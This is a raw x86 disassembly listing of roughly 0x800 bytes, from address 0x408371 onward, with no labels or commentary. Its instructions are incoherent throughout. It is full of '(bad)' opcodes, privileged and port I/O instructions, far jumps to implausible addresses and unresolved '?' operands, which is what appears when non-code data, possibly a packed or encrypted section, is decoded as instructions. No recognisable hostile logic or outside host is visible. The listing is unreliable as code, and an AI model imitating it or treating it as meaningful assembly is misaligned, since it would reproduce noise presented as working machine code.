  408371:	and    edx,DWORD PTR [esi+ecx*1+0x74]
  408375:	add    edx,DWORD PTR [eax+0x282030e1]
  40837b:	pop    ss
  40837c:	xor    dl,cl
  40837e:	dec    esp
  40837f:	mov    edi,0x714d96e3
  408384:	inc    ebx
  408385:	push   eax
  408386:	push   0xffffff9e
  408388:	or     al,0xf0
  40838a:	ffree  st(4)
  40838c:	lods   eax,DWORD PTR ds:[esi]
  40838d:	mov    WORD PTR [ebp-0x77],?
  408390:	xor    DWORD PTR [esp+edi*2+0x5113deaa],esp
  408397:	inc    BYTE PTR [ebx]
  408399:	inc    esp
  40839a:	jbe    0x408379
  40839c:	ja     0x4083c5
  40839e:	sar    DWORD PTR [esi+0x4f],0x47
  4083a2:	in     al,0xbc
  4083a4:	call   0xb9c942ed
  4083a9:	pop    eax
  4083aa:	add    esi,DWORD PTR [esi]
  4083ac:	sahf   
  4083ad:	jle    0x40835c
  4083af:	jg     0x4083ca
  4083b1:	mov    cl,0x3f
  4083b3:	std    
  4083b4:	push   ss
  4083b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b6:	xor    bh,0xd2
  4083b9:	push   ebx
  4083ba:	pop    ecx
  4083bb:	pop    ebp
  4083bc:	or     DWORD PTR [ecx+esi*2],0x42
  4083c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083c1:	xchg   DWORD PTR [edi-0x1c],eax
  4083c4:	or     DWORD PTR [eax+eax*8],edi
  4083c7:	nop
  4083c8:	mov    DWORD PTR [ebx],ecx
  4083ca:	cmp    eax,DWORD PTR ds:0xf8b5eae4
  4083d0:	test   BYTE PTR [ebx],dh
  4083d2:	std    
  4083d3:	dec    ebp
  4083d4:	rcl    BYTE PTR [ebx-0x2c7f3dd6],0x4a
  4083db:	lods   al,BYTE PTR ds:[esi]
  4083dc:	jmp    0x5cc8222e
  4083e1:	adc    al,0x3a
  4083e3:	jmp    0x2644:0xc4207d3e
  4083ea:	mov    bl,0xa7
  4083ec:	jecxz  0x4083d3
  4083ee:	in     eax,dx
  4083ef:	jmp    0x408422
  4083f1:	ret    0x3595
  4083f4:	test   eax,0x9aa66c8c
  4083f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083fa:	loopne 0x4083c2
  4083fc:	(bad)
  408400:	leave  
  408401:	in     eax,0x74
  408403:	rcr    DWORD PTR [ebp+eax*1-0x5],0xfe
  408408:	cli    
  408409:	add    DWORD PTR [edi+0x18],edx
  40840c:	sub    eax,0x667947f8
  408411:	sbb    BYTE PTR [ebx],bh
  408413:	push   ebx
  408414:	mov    cl,0x0
  408416:	mov    esp,0x547736be
  40841b:	cwde   
  40841c:	push   0xabedf90b
  408421:	add    al,0x37
  408423:	(bad)  [edx-0x54]
  408426:	jp     0x408429
  408428:	sbb    DWORD PTR ds:0x54031dc0,esp
  40842e:	sub    DWORD PTR [eax],eax
  408430:	pop    esi
  408431:	ins    BYTE PTR es:[edi],dx
  408432:	xor    DWORD PTR [eax*4+0x47a11eb4],edx
  408439:	lea    ebx,[ecx-0x6b]
  40843c:	in     al,dx
  40843d:	inc    eax
  40843e:	retf   0xd114
  408441:	rcr    DWORD PTR [edi+eiz*8],cl
  408444:	rol    BYTE PTR [esi+ecx*4],cl
  408447:	ror    BYTE PTR [ecx+0x722817c5],0x56
  40844e:	or     eax,ecx
  408450:	hlt    
  408451:	cmp    DWORD PTR [ebx+esi*8],ecx
  408454:	mov    edi,0x40ad3eae
  408459:	test   BYTE PTR [ebx-0x41228662],dh
  40845f:	adc    bh,BYTE PTR [ebp-0x2d9fa571]
  408465:	out    0x1c,eax
  408467:	ret    0xf153
  40846a:	fidiv  DWORD PTR ds:0x776e73a1
  408470:	push   ecx
  408471:	push   ss
  408472:	or     BYTE PTR [esi-0x62],dh
  408475:	add    al,0x67
  408477:	pop    ebp
  408478:	scas   eax,DWORD PTR es:[edi]
  408479:	icebp  
  40847a:	sysenter 
  40847c:	cmp    edi,0x2c
  40847f:	nop
  408480:	mov    dl,0x93
  408482:	jae    0x4084c5
  408484:	jmp    0xebb41ffd
  408489:	call   0xbacc2692
  40848e:	jnp    0x4084af
  408490:	push   edi
  408491:	add    ecx,0x2
  408494:	xchg   esi,eax
  408495:	mov    BYTE PTR [ecx+0x13],ah
  408498:	add    BYTE PTR [ebx+0x21],0x5a
  40849c:	or     al,0xaf
  40849e:	add    cl,BYTE PTR [ecx-0x5d0772b5]
  4084a4:	sub    eax,0x283bef5a
  4084a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084aa:	aad    0x58
  4084ac:	ins    DWORD PTR es:[edi],dx
  4084ad:	pop    esp
  4084ae:	dec    ebx
  4084af:	repz fsub st,st(6)
  4084b2:	les    ebp,FWORD PTR [ebp+0x3c]
  4084b5:	inc    edx
  4084b6:	imul   dh
  4084b8:	retf   0x8c44
  4084bb:	xchg   BYTE PTR [esi],al
  4084bd:	lock sbb DWORD PTR [edx+0x326216bf],ecx
  4084c4:	ficomp WORD PTR [esi]
  4084c6:	pushfw 
  4084c8:	gs dec ebp
  4084ca:	xor    ebx,DWORD PTR [edi+0x59]
  4084cd:	stos   DWORD PTR es:[edi],eax
  4084ce:	and    BYTE PTR [ecx-0x345be547],cl
  4084d4:	jl     0x4084e7
  4084d6:	push   edi
  4084d7:	sub    al,0x71
  4084d9:	test   eax,ebx
  4084db:	and    dl,bh
  4084dd:	sub    DWORD PTR [edx-0x6a],eax
  4084e0:	jge    0x4084cc
  4084e2:	sub    al,0x5d
  4084e4:	andnps xmm6,XMMWORD PTR [esi+0x5f]
  4084e8:	jl     0x408518
  4084ea:	lods   al,BYTE PTR ds:[esi]
  4084eb:	in     eax,0xe9
  4084ed:	or     edx,DWORD PTR [edi]
  4084ef:	sub    esi,ebx
  4084f1:	pop    esi
  4084f2:	mov    ds:0xf79e0151,al
  4084f7:	mov    ebp,0x3af73128
  4084fc:	fwait
  4084fd:	int    0xaa
  4084ff:	inc    ebx
  408500:	call   0x17c2dd89
  408505:	(bad)  
  408507:	cmp    DWORD PTR ds:0xccf9b93f,0x63c4141f
  408511:	push   ecx
  408512:	pop    es
  408513:	scas   eax,DWORD PTR es:[edi]
  408514:	dec    eax
  408515:	mov    DWORD PTR [esi+eax*8+0x6b],ecx
  408519:	xchg   ecx,eax
  40851a:	mov    ebp,0x737f1a14
  40851f:	push   cs
  408520:	xchg   ebp,eax
  408521:	repz add DWORD PTR [ecx],ebx
  408524:	scas   al,BYTE PTR es:[edi]
  408525:	cmp    ch,ah
  408527:	dec    BYTE PTR [edi-0x43]
  40852a:	xor    esp,DWORD PTR [eax-0x2d6938f8]
  408530:	aaa    
  408531:	scas   al,BYTE PTR es:[edi]
  408532:	adc    al,0x11
  408534:	adc    DWORD PTR [ecx-0x4c],ecx
  408537:	pushf  
  408538:	out    dx,eax
  408539:	xchg   edx,eax
  40853a:	dec    edi
  40853b:	mov    esp,0x3358a501
  408540:	mov    esi,fs
  408542:	xchg   ebp,eax
  408543:	sbb    ah,BYTE PTR [ebx]
  408545:	jns    0x4085a4
  408547:	sbb    eax,0x2fa01bb6
  40854c:	aaa    
  40854d:	xor    edx,DWORD PTR [ebx-0x5f]
  408550:	mov    ?,WORD PTR [ebx]
  408552:	xor    DWORD PTR [ebp-0x485d8936],ebp
  408558:	and    BYTE PTR [ebx-0x4c87e45e],ch
  40855e:	mov    ah,0x4b
  408560:	mov    ah,0xfd
  408562:	clc    
  408563:	cwde   
  408564:	pop    ebx
  408565:	lahf   
  408566:	sbb    ebx,DWORD PTR [eax+0x5]
  408569:	adc    eax,0xb47c5e18
  40856e:	arpl   WORD PTR [edi+0x70836f8],dx
  408574:	or     al,0x3
  408576:	mov    DWORD PTR [edi],0x61630398
  40857c:	dec    edi
  40857d:	gs out dx,eax
  40857f:	cld    
  408580:	sbb    DWORD PTR [edx],0xffffffeb
  408583:	xchg   edx,eax
  408584:	mov    DWORD PTR [ecx],0x59ae16be
  40858a:	cmp    bl,BYTE PTR [ecx+0x34]
  40858d:	xchg   edx,eax
  40858e:	mov    eax,0x6a23a504
  408593:	test   DWORD PTR [esp+esi*8-0x5713a0a1],esp
  40859a:	mul    dl
  40859c:	call   0xdd6b:0x25733f2c
  4085a3:	lea    edi,[edi+edi*1-0x6d]
  4085a7:	in     al,0xc5
  4085a9:	mov    bl,0x2e
  4085ab:	inc    ebx
  4085ac:	js     0x4085c3
  4085ae:	dec    ebx
  4085af:	sub    ebx,DWORD PTR [esi]
  4085b1:	stc    
  4085b2:	loopne 0x4085c6
  4085b4:	adc    ecx,DWORD PTR [eax+esi*2-0x5f2df8b9]
  4085bb:	jb     0x408602
  4085bd:	fimul  WORD PTR [ebx+eax*4+0x39b15cab]
  4085c4:	adc    edx,DWORD PTR [eax+0xcc091d4]
  4085ca:	jo     0x408553
  4085cc:	add    eax,0x43e965c0
  4085d1:	mov    ch,bh
  4085d3:	out    dx,eax
  4085d4:	push   ebx
  4085d5:	dec    edx
  4085d6:	sub    eax,ebp
  4085d8:	jno    0x4085a2
  4085da:	test   DWORD PTR [eax],0x9cae5ae1
  4085e0:	retf   0x6b0a
  4085e3:	or     DWORD PTR ss:[edi-0x4173056e],esp
  4085ea:	fsincos 
  4085ec:	outs   dx,DWORD PTR ds:[esi]
  4085ed:	mov    esi,0xaf24ead2
  4085f2:	stos   BYTE PTR es:[edi],al
  4085f3:	pushf  
  4085f4:	les    esi,FWORD PTR [ebp-0x255367ee]
  4085fa:	out    dx,al
  4085fb:	sub    al,0xc5
  4085fd:	inc    BYTE PTR [edx-0x3e]
  408600:	mov    ds:0xc6293436,eax
  408605:	xchg   edi,eax
  408606:	push   ecx
  408607:	jecxz  0x4085f2
  408609:	jle    0x40865f
  40860b:	adc    al,0x73
  40860d:	sub    al,0xd7
  40860f:	add    edx,DWORD PTR [eax+0x1d]
  408612:	mov    bh,0xe3
  408614:	inc    esi
  408615:	les    edi,FWORD PTR [edi]
  408617:	and    edi,DWORD PTR [edx-0xe]
  40861a:	jb     0x4085c1
  40861c:	dec    edx
  40861d:	jl     0x408632
  40861f:	mov    DWORD PTR [ecx+0x1442b15f],ecx
  408625:	mov    cl,al
  408627:	or     DWORD PTR [eax+0x4d],0xffffff93
  40862b:	and    BYTE PTR [eax],0xa7
  40862e:	inc    edx
  40862f:	stos   BYTE PTR es:[edi],al
  408630:	aaa    
  408631:	xchg   esp,eax
  408632:	cmp    BYTE PTR [edx-0x56],ah
  408635:	sub    esi,eax
  408637:	pop    esi
  408638:	jbe    0x4085ff
  40863a:	or     DWORD PTR [edx],0xffffff9b
  40863d:	sar    DWORD PTR [ebp+0x6b],cl
  408640:	lea    eax,[edx-0x68a95b9e]
  408646:	dec    edx
  408647:	cdq    
  408648:	les    ecx,FWORD PTR [esi-0xad72217]
  40864e:	mov    ebx,0x7b2a6239
  408653:	clc    
  408654:	popf   
  408655:	popf   
  408656:	ret    0x4223
  408659:	not    BYTE PTR [edi+0x46adda8f]
  40865f:	stos   DWORD PTR es:[edi],eax
  408660:	(bad)  
  408661:	mov    ds:0x14f6bde1,eax
  408666:	loope  0x408634
  408668:	push   eax
  408669:	iret   
  40866a:	push   edx
  40866b:	push   esp
  40866c:	pop    ebx
  40866d:	jmp    0x1672:0xa6f8b299
  408674:	xor    dh,BYTE PTR [ebx+0x55880b34]
  40867a:	out    0xac,eax
  40867c:	cli    
  40867d:	in     eax,0x8c
  40867f:	mov    ebx,0x84ef06ae
  408684:	inc    ecx
  408685:	push   esi
  408686:	ror    BYTE PTR [ecx],1
  408688:	xor    DWORD PTR [esi],edi
  40868a:	out    0xef,eax
  40868c:	ret    
  40868d:	jae    0x40869e
  40868f:	push   ds
  408690:	inc    edx
  408691:	mov    dl,0xf9
  408693:	jb     0x408691
  408695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408696:	add    eax,0xf58aeb7d
  40869b:	imul   esp,edi,0xe17a4308
  4086a1:	mov    dh,0xe
  4086a3:	push   es
  4086a4:	jle    0x4086d3
  4086a6:	xchg   ebx,eax
  4086a7:	mov    esi,0x4cc072e7
  4086ac:	sbb    al,0x9c
  4086ae:	loop   0x408660
  4086b0:	dec    BYTE PTR [edx+0x25920436]
  4086b6:	test   BYTE PTR [edi+esi*8+0x7874fed8],bl
  4086bd:	xlat   BYTE PTR ds:[ebx]
  4086be:	scas   eax,DWORD PTR es:[edi]
  4086bf:	or     eax,0xf680e4c
  4086c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086c5:	jge    0x408713
  4086c7:	inc    esp
  4086c8:	jge    0x408659
  4086ca:	adc    edi,DWORD PTR [ecx+0x53]
  4086cd:	imul   eax,DWORD PTR [edx-0x6214c069],0x35230137
  4086d7:	inc    edi
  4086d8:	mov    al,ds:0x92a86401
  4086dd:	dec    edx
  4086de:	jg     0x4086e5
  4086e0:	jmp    0x5256ce80
  4086e5:	lods   al,BYTE PTR ds:[esi]
  4086e6:	and    al,0x4d
  4086e8:	dec    ebp
  4086e9:	mov    edx,0x79fc4b23
  4086ee:	pop    ecx
  4086ef:	repnz mov dl,0x9c
  4086f2:	dec    esp
  4086f3:	aaa    
  4086f4:	dec    ebp
  4086f5:	or     ebx,DWORD PTR cs:[eax]
  4086f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086f9:	aad    0x78
  4086fb:	cmp    BYTE PTR [ebx+0x2f],al
  4086fe:	ss ins BYTE PTR es:[edi],dx
  408700:	inc    ebp
  408701:	jl     0x4086da
  408703:	mov    ah,0x23
  408705:	jno    0x4086a3
  408707:	enter  0x6d39,0xdb
  40870b:	mov    esi,0x75d0ec30
  408710:	xchg   edx,eax
  408711:	loop   0x4086a6
  408713:	mov    eax,ds:0x77e78e77
  408718:	or     esp,DWORD PTR [edx+0x1c]
  40871b:	or     dl,dl
  40871d:	repnz mov eax,ds:0xa840ea9c
  408723:	gs sub eax,0x7e2926d4
  408729:	retf   0x412f
  40872c:	mov    BYTE PTR [ebx+0x4054657],cl
  408732:	xchg   esi,eax
  408733:	in     al,dx
  408734:	nop
  408735:	clc    
  408736:	xchg   ecx,eax
  408737:	xchg   esi,eax
  408738:	cmp    eax,0x3c3e7c9f
  40873d:	jmp    0xff4b196e
  408742:	push   edi
  408743:	mov    fs,WORD PTR [ebx+0x5460edd6]
  408749:	push   ebx
  40874a:	iret   
  40874b:	fld    DWORD PTR [eax+0x58b8de60]
  408751:	stc    
  408752:	inc    ecx
  408753:	cmp    ebx,DWORD PTR [eax]
  408755:	pop    esp
  408756:	stc    
  408757:	imul   ebp,DWORD PTR [edi+0x32],0x572f6e7c
  40875e:	lods   eax,DWORD PTR ds:[esi]
  40875f:	jmp    0x7446:0x2849bdef
  408766:	test   al,0x77
  408768:	jb     0x408722
  40876a:	mov    edx,DWORD PTR [ebx+0xe]
  40876d:	inc    esp
  40876e:	pusha  
  40876f:	dec    ebx
  408770:	push   0x7f960312
  408775:	xor    ebp,DWORD PTR [ebx-0x38]
  408778:	push   0xcd1f03f8
  40877d:	mov    ah,0x1
  40877f:	mov    WORD PTR [edx+0x12923550],?
  408785:	cwde   
  408786:	and    dl,0xb4
  408789:	shr    DWORD PTR [eax],cl
  40878b:	daa    
  40878c:	adc    al,0xe2
  40878e:	xchg   esi,eax
  40878f:	dec    eax
  408790:	mov    DWORD PTR [ecx+eiz*8+0x45],ecx
  408794:	je     0x408734
  408796:	sti    
  408797:	cmp    ecx,DWORD PTR ds:0x105849bf
  40879d:	push   ebx
  40879e:	push   esp
  40879f:	fdivr  st,st(6)
  4087a1:	imul   eax,ebx,0x8d0b03aa
  4087a7:	(bad)  
  4087a9:	xchg   edx,eax
  4087aa:	call   0x52a5e33f
  4087af:	lds    edx,FWORD PTR [edi+ebx*8-0x39]
  4087b3:	cwde   
  4087b4:	add    al,0x16
  4087b6:	je     0x4087a7
  4087b8:	add    esi,DWORD PTR [edx+0x37243aba]
  4087be:	test   DWORD PTR [ecx+0x5e],ecx
  4087c1:	lods   al,BYTE PTR ds:[esi]
  4087c2:	dec    esi
  4087c3:	xchg   edx,edi
  4087c5:	stos   DWORD PTR es:[edi],eax
  4087c6:	imul   eax,DWORD PTR [esi+0x6bd97ae],0x2d7e09dd
  4087d0:	jo     0x408810
  4087d2:	sbb    eax,0xf58aecfb
  4087d7:	adc    cl,ch
  4087d9:	push   es
  4087da:	stos   DWORD PTR es:[edi],eax
  4087db:	pop    ecx
  4087dc:	int    0xef
  4087de:	dec    ebx
  4087df:	aaa    
  4087e0:	dec    eax
  4087e1:	daa    
  4087e2:	push   ecx
  4087e3:	ret    
  4087e4:	scas   eax,DWORD PTR es:[edi]
  4087e5:	pop    ecx
  4087e6:	mov    esi,0x78925c10
  4087eb:	and    esp,eax
  4087ed:	ror    BYTE PTR [esi],1
  4087ef:	sub    DWORD PTR [edx-0x230e08cc],ecx
  4087f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087f6:	pushf  
  4087f7:	ss shl ah,cl
  4087fa:	sub    al,0xdf
  4087fc:	or     al,0xaf
  4087fe:	xchg   BYTE PTR [eax+0x153440fb],cl
  408804:	bound  edi,QWORD PTR [ebx]
  408806:	hlt    
  408807:	mov    edx,0x7b36ed73
  40880c:	xchg   esp,eax
  40880d:	push   ss
  40880e:	xchg   ebx,eax
  40880f:	mov    dh,0x12
  408811:	cli    
  408812:	pop    esi
  408813:	stos   BYTE PTR es:[edi],al
  408814:	es jbe 0x408799
  408817:	push   0x4f879aca
  40881c:	jo     0x4087a8
  40881e:	push   0x2
  408820:	pop    eax
  408821:	icebp  
  408822:	xchg   DWORD PTR [ebx-0x78f5e5ac],edx
  408828:	cmp    DWORD PTR ds:0x8a6eaac2,ecx
  40882e:	mov    gs,WORD PTR [ebp+edx*4-0x379b4642]
  408835:	or     eax,0x42463681
  40883a:	pop    edx
  40883b:	(bad)  
  40883c:	or     eax,0x27acea08
  408841:	call   FWORD PTR [ecx-0x51305467]
  408847:	or     al,0x77
  408849:	iret   
  40884a:	cdq    
  40884b:	int    0x50
  40884d:	xchg   DWORD PTR [edi],ecx
  40884f:	add    dl,BYTE PTR [edx+ebp*4-0x73]
  408853:	test   eax,0xc8fe826e
  408858:	jmp    0xc79caeec
  40885d:	push   es
  40885e:	bound  ebp,QWORD PTR [ebx+0x1c]
  408861:	lods   al,BYTE PTR ds:[esi]
  408862:	lods   al,BYTE PTR ds:[esi]
  408863:	cmp    dh,ch
  408865:	dec    ecx
  408866:	dec    eax
  408867:	call   0x2d7a5b54
  40886c:	add    DWORD PTR [ebp-0x64ee7575],esp
  408872:	jle    0x4088dc
  408874:	mov    dh,0x88
  408876:	mov    DWORD PTR [esi],0xbdfc582b
  40887c:	mov    ds:0xc012d665,al
  408881:	adc    DWORD PTR [ebx-0x68],edi
  408884:	jl     0x4088d4
  408886:	loop   0x40888c
  408888:	int    0x65
  40888a:	ret    
  40888b:	jae    0x408891
  40888d:	cmc    
  40888e:	push   eax
  40888f:	sbb    DWORD PTR [ebx-0x7d],0xb1969b9d
  408896:	add    BYTE PTR [ecx+0x25614a7],al
  40889c:	mov    BYTE PTR [ebp+0x7a],bh
  40889f:	add    al,0xb
  4088a1:	in     al,dx
  4088a2:	pop    ebp
  4088a3:	das    
  4088a4:	xchg   ebp,eax
  4088a5:	nop
  4088a6:	sub    BYTE PTR [edx+0x7b14241e],0x55
  4088ad:	pop    ecx
  4088ae:	test   BYTE PTR [edx+0x65],0xad
  4088b2:	cmp    BYTE PTR [esi+0xe],dh
  4088b5:	xor    DWORD PTR [edx],edi
  4088b7:	pop    ss
  4088b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088b9:	nop
  4088ba:	(bad)  
  4088bc:	and    cl,BYTE PTR [ebx+0x5ae891ca]
  4088c2:	iret   
  4088c3:	dec    ebx
  4088c4:	scas   eax,DWORD PTR es:[edi]
  4088c5:	dec    BYTE PTR [ebx+0x17]
  4088c8:	mov    dh,0x5d
  4088ca:	xchg   ecx,eax
  4088cb:	mov    BYTE PTR [eax+ecx*1],ch
  4088ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088cf:	bound  eax,QWORD PTR [edx]
  4088d1:	sahf   
  4088d2:	into   
  4088d3:	mov    ch,bh
  4088d5:	jno    0x408892
  4088d7:	pop    ss
  4088d8:	jg     0x408903
  4088da:	into   
  4088db:	cli    
  4088dc:	bound  ebx,QWORD PTR [esi-0x44]
  4088df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088e0:	sub    edx,ecx
  4088e2:	inc    ebx
  4088e3:	push   esp
  4088e4:	xor    ebp,DWORD PTR [eax-0x5d2c0c13]
  4088ea:	dec    ebp
  4088eb:	or     ch,BYTE PTR [ebx+0x63]
  4088ee:	ror    DWORD PTR [esi+0x6d],1
  4088f1:	mov    BYTE PTR [eax],dh
  4088f3:	loope  0x4088e9
  4088f5:	cmc    
  4088f6:	hlt    
  4088f7:	mov    edi,0xd3b80979
  4088fc:	add    BYTE PTR [esi],dh
  4088fe:	mov    dl,0x2a
  408900:	leave  
  408901:	aam    0x5f
  408903:	and    al,0x45
  408905:	mov    BYTE PTR fs:[ebp+0x5fb6f3af],bl
  40890c:	iret   
  40890d:	mov    WORD PTR [eax+0x39],es
  408910:	popf   
  408911:	mov    WORD PTR [edx-0x41],?
  408914:	or     BYTE PTR [ecx+0x1bbf4bc6],al
  40891a:	movntq QWORD PTR [esi],mm1
  40891d:	pop    edi
  40891e:	jle    0x40893b
  408920:	mov    ds:0x98d04b5e,al
  408925:	hlt    
  408926:	jge    0x408907
  408928:	shl    dh,1
  40892a:	fdiv   st,st(6)
  40892c:	push   eax
  40892d:	imul   BYTE PTR [eax-0x7de3873a]
  408933:	inc    eax
  408934:	in     eax,0x6f
  408936:	mov    ebx,0x86e97c6c
  40893b:	adc    edx,DWORD PTR [ecx]
  40893d:	test   al,0xa4
  40893f:	loop   0x40896f
  408941:	pushf  
  408942:	ss push ebx
  408944:	lods   eax,DWORD PTR ds:[esi]
  408945:	sub    DWORD PTR [ecx],ebp
  408947:	push   cs
  408948:	inc    ebx
  408949:	aas    
  40894a:	loope  0x408947
  40894c:	mov    BYTE PTR [eax+0x1b],bl
  40894f:	and    ebx,edx
  408951:	fisubr WORD PTR [esi+esi*8+0xc3e473b]
  408958:	call   DWORD PTR [esi+0x23]
  40895b:	push   edi
  40895c:	ds aam 0xaa
  40895f:	sbb    eax,0x16ad4359
  408964:	jmp    0x408976
  408966:	fisttp QWORD PTR [edi-0x5c]
  408969:	push   ebp
  40896a:	mov    eax,0x2a60382a
  40896f:	fs push ss
  408971:	add    BYTE PTR ds:0x9834c867,ch
  408977:	es adc edi,ebx
  40897a:	pop    es
  40897b:	shl    BYTE PTR [ebp+0x1cff20ea],cl
  408981:	jle    0x40899f
  408983:	scas   eax,DWORD PTR es:[di]
  408985:	xor    eax,0xe1d37d19
  40898a:	or     eax,0xe16756a7
  40898f:	mov    esi,0xae9c5fd9
  408994:	popw   ds
  408996:	xor    edi,DWORD PTR [edx+0x6b]
  408999:	retf   
  40899a:	adc    BYTE PTR [edi-0x54],dl
  40899d:	or     eax,0x38acfe9a
  4089a2:	daa    
  4089a3:	jmp    0x4089e9
  4089a5:	sub    cl,cl
  4089a7:	pop    esi
  4089a8:	and    bh,dh
  4089aa:	loop   0x408944
  4089ac:	hlt    
  4089ad:	add    BYTE PTR [ebp+0x259cecf6],al
  4089b3:	pop    ebx
  4089b4:	xor    al,0xa8
  4089b6:	jg     0x408a00
  4089b8:	sub    eax,0xdfa0aae8
  4089bd:	scas   al,BYTE PTR es:[edi]
  4089be:	nop
  4089bf:	mov    al,ds:0x5203f320
  4089c4:	adc    ebp,DWORD PTR [ebp-0x46]
  4089c7:	iret   
  4089c8:	push   ebx
  4089c9:	lock sub BYTE PTR [eax-0x2a],ch
  4089cd:	lods   eax,DWORD PTR ds:[esi]
  4089ce:	sbb    edx,DWORD PTR [bp+0x3774]
  4089d3:	ror    BYTE PTR [edx*1+0x37741ddd],1
  4089da:	scas   al,BYTE PTR es:[di]
  4089dc:	pop    es
  4089dd:	(bad)  
  4089df:	mov    ebx,0x7e6ac2d4
  4089e4:	ja     0x4089d2
  4089e6:	fnstcw WORD PTR [ecx]
  4089e8:	lock jbe 0x40898e
  4089eb:	cmp    BYTE PTR [ebp+0x49a6608c],bh
  4089f1:	daa    
  4089f2:	pop    esi
  4089f3:	(bad)  
  4089f4:	xchg   ebp,eax
  4089f5:	sbb    ch,0x1d
  4089f8:	pop    ebp
  4089f9:	dec    edi
  4089fa:	jbe    0x408995
  4089fc:	ficomp DWORD PTR [eax]
  4089fe:	bound  ebx,QWORD PTR [eax]
  408a00:	jl     0x408a60
  408a02:	fld    TBYTE PTR [eax]
  408a04:	jmp    0x8342:0x2e3eb948
  408a0b:	(bad)  
  408a0c:	push   DWORD PTR [ebx]
  408a0e:	xchg   edi,eax
  408a0f:	scas   al,BYTE PTR es:[edi]
  408a10:	js     0x408a78
  408a12:	pop    eax
  408a13:	sub    al,0x2a
  408a15:	out    0xd2,al
  408a17:	inc    eax
  408a18:	inc    esp
  408a19:	jns    0x4089d2
  408a1b:	test   DWORD PTR [edx-0x38cd9af1],esi
  408a21:	xlat   BYTE PTR ds:[bx]
  408a23:	rcr    BYTE PTR [edi+0x7a],0xb2
  408a27:	cmp    al,0xf4
  408a29:	xchg   edi,eax
  408a2a:	sbb    BYTE PTR [edx+ecx*8],ch
  408a2d:	or     DWORD PTR [eax],ecx
  408a2f:	repz adc al,0xe2
  408a32:	mov    WORD PTR [edi],fs
  408a34:	addr16 mov ecx,0x5d9e1194
  408a3a:	in     al,dx
  408a3b:	jmp    0x4089c6
  408a3d:	arpl   WORD PTR [ebp+0x133cfb81],sp
  408a43:	sbb    edx,DWORD PTR [ebx]
  408a45:	mov    al,0xb1
  408a47:	mov    ds:0x4368b3d9,eax
  408a4c:	xor    BYTE PTR [ecx+ecx*8],ah
  408a4f:	xlat   BYTE PTR ds:[ebx]
  408a50:	xor    al,0x19
  408a52:	lods   eax,DWORD PTR ds:[esi]
  408a53:	adc    dh,ch
  408a55:	fsubp  st(5),st
  408a57:	sar    DWORD PTR [ebp+0x6bac00fb],0x55
  408a5e:	inc    ebp
  408a5f:	shr    DWORD PTR [ebx-0x2f],1
  408a62:	xor    BYTE PTR [eax-0x3a],ah
  408a65:	lahf   
  408a66:	push   edx
  408a67:	addr16 out dx,eax
  408a69:	dec    esi
  408a6a:	mov    eax,0xafa6d682
  408a6f:	xor    cl,BYTE PTR [esi-0x3f]
  408a72:	into   
  408a73:	bound  edi,QWORD PTR [ecx-0x24d262c9]
  408a79:	not    BYTE PTR [eax+0x49]
  408a7c:	cwde   
  408a7d:	sub    eax,0xc2c4c446
  408a82:	xchg   BYTE PTR [ebx+0x6ed6b813],ch
  408a88:	xchg   ecx,eax
  408a89:	lods   eax,DWORD PTR ds:[esi]
  408a8a:	and    DWORD PTR [edx+edi*1-0x75ca8e97],edi
  408a91:	sbb    eax,DWORD PTR [ecx+0x14]
  408a94:	neg    BYTE PTR [ecx+0x10]
  408a97:	inc    esi
  408a98:	fnstcw WORD PTR [edi-0x6c7bbc39]
  408a9e:	frndint 
  408aa0:	shl    BYTE PTR [ebx],cl
  408aa2:	(bad)  
  408aa3:	loope  0x408a62
  408aa5:	call   0xaca9:0x76853d00
  408aac:	cli    
  408aad:	xlat   BYTE PTR ds:[ebx]
  408aae:	pop    esp
  408aaf:	sub    BYTE PTR fs:[eax-0x2df72b20],dl
  408ab6:	fucomi st,st(4)
  408ab8:	fwait
  408ab9:	mov    bl,cl
  408abb:	cmp    eax,0x218e1e5c
  408ac0:	add    BYTE PTR [ebx+ebx*4-0x1197722a],dl
  408ac7:	dec    ecx
  408ac8:	push   esp
  408ac9:	scas   eax,DWORD PTR es:[edi]
  408aca:	jae    0x408a4f
  408acc:	push   edi
  408acd:	dec    eax
  408ace:	mov    ebx,0x26c4f330
  408ad3:	and    BYTE PTR [edx],bl
  408ad5:	mov    ah,0x30
  408ad7:	sbb    eax,0x3d0f7265
  408adc:	stos   DWORD PTR es:[edi],eax
  408add:	xchg   DWORD PTR [eax+0x62],ebx
  408ae0:	mov    esi,0x708c52da
  408ae5:	fadd   QWORD PTR [edi+edi*1-0xbff483]
  408aec:	push   esi
  408aed:	sbb    DWORD PTR [edi-0x29],edx
  408af0:	jp     0x408b4c
  408af2:	shl    DWORD PTR [edx-0x520356e2],cl
  408af8:	sub    edi,DWORD PTR [eax+0x23]
  408afb:	out    0x39,eax
  408afd:	jns    0x408b33
  408aff:	push   ds
  408b00:	xor    edi,DWORD PTR [esi]
  408b02:	outs   dx,DWORD PTR ds:[esi]
  408b03:	scas   al,BYTE PTR es:[edi]
  408b04:	xor    al,0x81
  408b06:	leave  
  408b07:	xor    al,0x72
  408b09:	sbb    eax,0x4049a54e
  408b0e:	scas   eax,DWORD PTR es:[edi]
  408b0f:	pop    edx
  408b10:	xchg   edx,eax
  408b11:	bound  esi,QWORD PTR [esp+esi*1]
  408b14:	xor    dh,bh
  408b16:	mov    esp,0x12fc70dd
  408b1b:	jns    0x408ab4
  408b1d:	lea    ebx,[ebp-0x1c]
  408b20:	das    
  408b21:	jnp    0x408afc
  408b23:	in     al,dx
  408b24:	popf   
  408b25:	cmp    al,BYTE PTR [ebp-0x50]
  408b28:	mov    edi,0x84d26a87
  408b2d:	ror    BYTE PTR [edi-0x57],0x73
  408b31:	inc    edx
  408b32:	(bad)  [ecx]
  408b34:	adc    eax,0x7d948e60
  408b39:	sub    ebp,DWORD PTR [esi]
  408b3b:	add    esi,DWORD PTR [esi]
